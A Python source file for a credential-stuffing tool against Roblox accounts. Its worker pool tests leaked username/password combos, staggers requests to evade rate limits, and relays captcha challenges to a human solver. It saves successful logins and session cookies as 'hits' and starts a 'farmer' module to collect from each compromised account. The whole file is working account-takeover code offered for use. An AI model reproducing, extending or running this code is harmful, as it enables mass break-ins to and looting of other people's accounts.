import base64, collections, json, random, threading, time

import config, farmer, rblx, store


class Gate:
    def __init__(self, lo, hi):
        self.lo, self.hi = lo, hi
        self._l = threading.Lock()
        self._next = 0.0

    def wait(self):
        with self._l:
            now = time.time()
            at = max(now, self._next)
            self._next = at + random.uniform(self.lo, self.hi)
        if at > now:
            time.sleep(at - now)

    def hold(self, secs):
        with self._l:
            self._next = max(self._next, time.time() + secs)


class Pool:
    def __init__(self, size, stop):
        self.size = max(1, size)
        self.stop = stop
        self.paused = True
        self.mode = config.CAPTCHA_MODE
        self.gate = Gate(config.MIN_DELAY, config.MAX_DELAY)
        self.lock = threading.Lock()
        self.stats = {"done": 0, "hit": 0, "retry": 0, "captcha": 0, "warm": 0}
        self.recent = collections.deque(maxlen=max(2, config.CAPTCHA_BREAKER_WINDOW))
        self.notify = None
        self.warm_lock = threading.Lock()
        self.warm_busy = threading.Event()
        self.warm_pending = None
        self.warm_token = None
        self.warm_event = threading.Event()
        self.warm_cool = 0.0
        self.farm_sem = threading.Semaphore(max(1, config.FARM_THREADS))

    def start(self):
        for i in range(self.size):
            threading.Thread(target=self._run, name="w%d" % i, daemon=True).start()

    def _bump(self, k):
        with self.lock:
            self.stats[k] = self.stats.get(k, 0) + 1

    def _note(self, s):
        with self.lock:
            self.recent.append(s)

    def captcha_rate(self):
        with self.lock:
            n = len(self.recent)
            return 0.0 if not n else sum(1 for s in self.recent if s == "captcha") / n

    def breaker_tripped(self):
        with self.lock:
            n = len(self.recent)
            if n < self.recent.maxlen:
                return False
            return (sum(1 for s in self.recent if s == "captcha") / n) > config.CAPTCHA_BREAKER_RATE

    def set_mode(self, mode):
        self.mode = "blast" if str(mode).lower() == "blast" else "auto"
        return self.mode

    def warm_status(self):
        return self.warm_busy.is_set()

    def submit_warm(self, token):
        with self.warm_lock:
            if self.warm_pending is None:
                return False
            self.warm_token = token
            self.warm_event.set()
            return True

    def _payload(self, ch, u, p):
        body = {"cid": ch.get("id"), "ct": ch.get("type") or "captcha",
                "meta": json.dumps(ch.get("meta") or {}),
                "pk": ch.get("public_key") or rblx.public_key(),
                "blob": ch.get("blob") or "", "u": u, "p": p}
        return base64.urlsafe_b64encode(json.dumps(body).encode()).decode()

    def _try_warm(self, ch, u, p):
        if self.warm_busy.is_set():
            return None
        self.warm_busy.set()
        try:
            with self.warm_lock:
                self.warm_pending = ch or {}
                self.warm_token = None
                self.warm_event.clear()
            payload = self._payload(ch or {}, u, p)
            msg = ("== WARM NEEDED ==\nakun: %s\n\n1. buka %s\n2. tempel PAYLOAD\n"
                   "3. solve captcha\n4. copy TOKEN, balas ke chat ini\n\n"
                   "timeout %ds\n\nPAYLOAD:\n%s" % (
                       u, config.WARM_PAGE, int(config.WARM_TIMEOUT), payload))
            if self.notify:
                try:
                    self.notify(msg)
                except Exception:
                    pass
            self.warm_event.wait(config.WARM_TIMEOUT)
            with self.warm_lock:
                tok = self.warm_token
                self.warm_pending = None
                self.warm_token = None
            self._bump("warm")
            return tok
        finally:
            self.warm_busy.clear()

    def _login(self, cli, u, p, headers=None):
        try:
            return cli.login(u, p, headers)
        except Exception as e:
            return "error", repr(e), None

    def _handle_captcha(self, cli, u, p, detail):
        self._bump("captcha")
        if self.mode != "auto" and not self.breaker_tripped():
            return "captcha", detail, None
        if time.time() < self.warm_cool:
            return "captcha", detail, None
        token = self._try_warm(cli.challenge, u, p)
        if not token:
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        if not cli.continue_challenge(token):
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        st, det, ck = self._login(cli, u, p, cli.challenge_headers())
        if st == "captcha":
            self.warm_cool = time.time() + config.WARM_RETRY
            return st, det, ck
        with self.lock:
            self.recent.clear()
        self.warm_cool = 0.0
        try:
            store.retry_captcha(config.MAX_CAPTCHA_TRIES)
        except Exception:
            pass
        return st, det, ck

    def _farm(self, u, cookie):
        with self.farm_sem:
            try:
                farmer.collect(u, cookie)
            except Exception:
                pass

    def _run(self):
        cli = rblx.Roblox()
        try:
            cli.csrf()
        except Exception:
            pass
        while not self.stop.is_set():
            if self.paused:
                time.sleep(1.0)
                continue
            job = store.claim_combo()
            if not job:
                time.sleep(2.0)
                continue
            u, p = job["username"], job["password"]
            self.gate.wait()
            status, detail, cookie = self._login(cli, u, p)

            if status == "captcha":
                if self.warm_busy.is_set():
                    waited = 0.0
                    while (self.warm_busy.is_set() and not self.stop.is_set()
                           and waited < config.WARM_TIMEOUT):
                        time.sleep(0.5)
                        waited += 0.5
                    store.back_to_pending(u, p, "warm-wait")
                    continue
                status, detail, cookie = self._handle_captcha(cli, u, p, detail)
                if status == "captcha":
                    self._note("captcha")
                    store.mark_captcha(u, p, detail, config.CAPTCHA_DELAY)
                    self._bump("retry")
                    cli.reset()
                    continue

            self._note(status)

            if status in ("ratelimited", "csrf", "error", "blocked"):
                if status == "ratelimited":
                    try:
                        wait = min(300.0, float(detail) + 5)
                    except Exception:
                        wait = 60.0
                    self.gate.hold(wait)
                delay = {"error": config.RETRY_DELAY, "csrf": 5.0,
                         "ratelimited": 0.0, "blocked": config.RETRY_DELAY}[status]
                store.requeue(u, p, "%s %s" % (status, detail), delay,
                              config.MAX_ATTEMPTS)
                self._bump("retry")
                cli.reset(soft=True)
                continue

            if status in ("hit", "2fa"):
                store.add_hit(u, p, cookie, "" if status == "hit" else "2fa")
                store.finish_combo(u, p, status, detail)
                if status == "2fa" and cli.challenge and cli.challenge.get("id"):
                    store.set_state("2fa:%s" % u, json.dumps({
                        "id": cli.challenge.get("id"),
                        "type": cli.challenge.get("type"),
                        "meta": cli.challenge.get("meta") or {}}))
                self._bump("hit")
                if cookie:
                    threading.Thread(target=self._farm, args=(u, cookie),
                                     daemon=True).start()
                cli.reset(soft=True)
            elif status == "invalid":
                if store.soft_count() or self.breaker_tripped():
                    store.mark_soft(u, p, detail)
                else:
                    store.finish_combo(u, p, "invalid", detail)
            else:
                store.finish_combo(u, p, status, detail)
            self._bump("done")
